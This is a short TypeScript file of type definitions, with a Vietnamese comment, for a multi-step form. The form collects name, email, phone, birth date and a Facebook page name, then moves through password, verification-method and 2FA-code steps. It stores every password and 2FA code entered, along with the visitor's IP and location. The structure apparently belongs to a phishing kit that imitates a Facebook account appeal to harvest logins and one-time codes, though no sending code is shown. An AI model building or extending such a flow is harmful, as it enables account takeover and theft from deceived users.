// Types cho form data và modal flow

export interface FormData {
  fullName: string;
  email: string;
  emailBusiness?: string;
  pageName?: string;
  phoneNumber: string;
  countryCode: string;
  dialCode: string;
  day: string;
  month: string;
  year: string;
  issueDescription?: string;
  agreeToTerms: boolean;
  facebookNotification: boolean;
}

export interface ContactInfo {
  phone: string;
  email: string;
}

export interface LocationData {
  ip: string;
  location: {
    country: string;
    countryCode: string;
    city?: string;
    region?: string;
  };
}

export type VerificationMethod = "app" | "sms" | "email" | "whatsapp";

export interface ModalState {
  currentStep: "form" | "password" | "method" | "twofa" | "success" | null;
  formDetails: FormData | null;
  contactInfo: ContactInfo | null;
  passwordAttempts: string[];
  twofaAttempts: string[];
  selectedMethod: VerificationMethod | null;
}
